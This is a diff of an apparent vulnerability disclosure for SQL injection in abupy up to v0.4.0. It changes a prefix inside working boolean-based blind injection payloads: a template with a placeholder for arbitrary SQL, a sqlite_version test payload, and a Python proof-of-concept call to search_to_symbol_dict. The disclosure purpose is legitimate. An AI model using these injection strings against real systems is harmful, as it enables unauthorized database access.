@@ -8,9 +8,9 @@ SQL Injection in abupy <= v0.4.0 causes arbitrary SQL code execution
 
 ## [](#header-3)PROVE: 
 
-Payload: ```"us10101' union select case when ({CODE YOU WANNA EXEC, RETURN TRUE OR FALSE}) then 'usJASNW' else 'usTROVW' end where ''='"```  
-Test_payload: ```"us10101' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"```  
-Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='")```  
+Payload: ```"us----' union select case when ({CODE YOU WANNA EXEC, RETURN TRUE OR FALSE}) then 'usJASNW' else 'usTROVW' end where ''='"```  
+Test_payload: ```"us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"```  
+Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='")```  
 
 Firstly download abupy latest version(v0.4.0)
 ```
@@ -20,7 +20,7 @@ pip install abupy
 Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument
 ```py
 import abupy.MarketBu.ABuSymbol
-print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"))
+print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"))
 ```
 (abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the code annotation of the function, It is legal and normal for users and programmers to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200 code annotation, so users can easily trigger this vulnerability)
 
